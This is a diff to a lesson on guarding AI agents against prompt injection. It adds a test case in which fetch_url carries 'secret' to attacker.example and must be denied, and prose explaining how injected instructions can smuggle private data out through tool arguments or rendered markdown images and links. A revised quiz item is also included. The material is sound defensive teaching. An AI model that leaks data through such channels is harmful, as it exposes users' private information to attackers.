@@ -125,6 +125,15 @@ String.raw`def check(expected, tool, touched, arguments=None, why=""):
 
 check("deny", "delete_everything", set(), why="an undeclared tool is denied: fail closed")
 `,
+// a read whose arguments leave the system is labelled external too, and must be treated as sending out
+String.raw`tool_labels = {"fetch_url": {"untrusted", "external"}, "get_agent": {"private"}}
+assert decide("fetch_url", {"url": "https://attacker.example/?d=secret"}, {"untrusted", "private"}, tool_labels) == "deny", \
+    "fetch_url sends its URL out: after untrusted content and private data, it can carry the data away, so deny it"
+assert decide("fetch_url", {"url": "https://example.com"}, {"untrusted"}, tool_labels) == "approve", \
+    "fetch_url sends its URL out: after untrusted content, a person confirms it"
+assert decide("fetch_url", {"url": "https://example.com"}, set(), tool_labels) == "allow", \
+    "in a clean session, fetching is allowed"
+`,
 String.raw`def check(expected, tool, touched, arguments=None, why=""):
     got = decide(tool, arguments or {}, set(touched), TOOL_LABELS)
     assert got == expected, f"decide({tool!r}, touched={sorted(touched)}) gave {got!r}, expected {expected!r}: {why}"
@@ -184,7 +193,7 @@ So the rule this lesson uses is stricter than two-of-three:
 
 | The session has read untrusted content, and the tool... | Decision |
 |---|---|
-| only reads | allow |
+| only reads, and nothing it's given leaves the system | allow |
 | changes state inside the system | approve |
 | sends data out, and the session hasn't touched private data | approve |
 | sends data out, and the session has touched private data | deny |
@@ -192,6 +201,17 @@ So the rule this lesson uses is stricter than two-of-three:
 
 In a session that hasn't read anything untrusted, this guard allows every
 declared tool; any gate Module 3 already put on writes still applies on top.
+
+"Only reads" is narrower than it sounds. A read is safe here only if nothing
+the model puts in its arguments reaches anyone outside. Fetching a URL, running
+a web search or calling a third-party API sends the arguments out, so an
+injected instruction can hide private data in them. Those tools are labelled
+`external` as well as `untrusted`, as the previous concept did with
+`fetch_url`, and the table then treats them as sending data out. The final
+answer is an outgoing channel too. If the interface renders a markdown image
+or link, the user's browser requests that URL as soon as the answer is shown.
+So an answer from a session that has read untrusted text shouldn't be rendered
+with live links or images to arbitrary addresses.
 
 Denying the last combination, rather than asking a person, is a design
 choice worth explaining. Approving an outgoing message after the session has
@@ -266,7 +286,7 @@ do from this point on is fixed by code it can't write to.
       "Only if the email is deleted before the read"
     ],
     "correctIndex": 1,
-    "explanation": "The risk comes from acting, not reading. The read adds \"private\" to the session, which is what makes a later outgoing call denied."
+    "explanation": "Reading private data sends nothing out, so it's allowed. It adds \"private\" to the session, which is what makes a later outgoing call denied. A read whose arguments do leave the system, such as fetching a URL, is different: it's labelled external too, and is treated as sending data out."
   }
 ]}
 />
